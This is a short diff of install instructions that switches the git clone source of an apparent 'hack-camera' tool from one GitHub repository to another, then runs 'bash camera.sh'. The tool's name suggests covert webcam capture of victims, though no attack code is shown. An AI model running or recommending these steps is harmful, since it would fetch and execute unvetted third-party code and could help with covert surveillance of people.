@@ -19,10 +19,10 @@ mkdir hackcam
 
 cd hackcam
 
-git clone https://github.com/reyspeed/hack-camera
+git clone https://github.com/mrpaktoto/hackcam
 
 
-cd hack-camera
+cd hackcam
 
 
 bash camera.sh
